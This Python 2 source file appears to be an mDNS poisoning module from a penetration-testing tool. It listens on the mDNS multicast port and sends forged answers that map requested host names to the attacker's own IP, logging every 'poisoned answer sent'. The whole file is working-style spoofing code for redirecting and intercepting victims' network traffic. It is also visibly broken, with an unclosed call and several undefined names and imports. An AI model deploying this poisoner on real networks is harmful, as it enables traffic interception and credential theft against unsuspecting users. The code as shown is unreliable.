#! /usr/bin/env python2.7

from SocketServer import UDPServer, ThreadingMixIn, BaseRequestHandler
import threading
import struct

from core.protocols.odict import OrderedDict
from core.protocols.packet import Packet

class MDNSPoisoner():

	def start():
		try:
			server = ThreadingUDPMDNSServer(("0.0.0.0", 5353), MDNS)
			t = threading.Thread(name="MDNS", target=server.serve_forever)
			t.setDaemon(True)
			t.start()
		except Exception, e:
			print "Error starting MDNSPoisoner on port %s: %s:" % (str(port),str(e))

class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):

	allow_reuse_address = 1

	def server_bind(self):
		MADDR = "224.0.0.251"
		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR)+inet_aton(OURIP))

		UDPServer.server_bind(self

class MDNSAns(Packet):
	fields = OrderedDict([
		("Tid",              "\x00\x00"),
		("Flags",            "\x84\x00"),
		("Question",         "\x00\x00"),
		("AnswerRRS",        "\x00\x01"),
		("AuthorityRRS",     "\x00\x00"),
		("AdditionalRRS",    "\x00\x00"),
		("AnswerName",       ""),
		("AnswerNameNull",   "\x00"),
		("Type",             "\x00\x01"),
		("Class",            "\x00\x01"),
		("TTL",              "\x00\x00\x00\x78"),##Poison for 2mn.
		("IPLen",            "\x00\x04"),
		("IP",               "\x00\x00\x00\x00"),
	])

	def calculate(self):
		self.fields["IP"] = inet_aton(OURIP)
		self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))

def Parse_MDNS_Name(data):
	data = data[12:]
	NameLen = struct.unpack('>B',data[0])[0]
	Name = data[1:1+NameLen]
	NameLen_ = struct.unpack('>B',data[1+NameLen])[0]
	Name_ = data[1+NameLen:1+NameLen+NameLen_+1]
	return Name+'.'+Name_

def Poisoned_MDNS_Name(data):
	data = data[12:]
	Name = data[:len(data)-5]
	return Name

class MDNS(BaseRequestHandler):

	def handle(self):
		MADDR = "224.0.0.251"
		MPORT = 5353
		data, soc = self.request
		if self.client_address[0] == "127.0.0.1":
			pass
		try:
			if AnalyzeMode:
				if Parse_IPV6_Addr(data):
					#print '[Analyze mode: MDNS] Host: %s is looking for : %s'%(self.client_address[0],Parse_MDNS_Name(data))
					responder_logger.info('[Analyze mode: MDNS] Host: %s is looking for : %s'%(self.client_address[0],Parse_MDNS_Name(data)))

			if RespondToSpecificHost(RespondTo):
				if AnalyzeMode == False:
					if RespondToIPScope(RespondTo, self.client_address[0]):
						if Parse_IPV6_Addr(data):
							#print 'MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data))
							responder_logger.info('MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
							Name = Poisoned_MDNS_Name(data)
							MDns = MDNSAns(AnswerName = Name)
							MDns.calculate()
							soc.sendto(str(MDns),(MADDR,MPORT))

			if AnalyzeMode == False and RespondToSpecificHost(RespondTo) == False:
				if Parse_IPV6_Addr(data):
					#print 'MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data))
					responder_logger.info('MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
					Name = Poisoned_MDNS_Name(data)
					MDns = MDNSAns(AnswerName = Name)
					MDns.calculate()
					soc.sendto(str(MDns),(MADDR,MPORT))
			else:
				pass
		except Exception:
			raise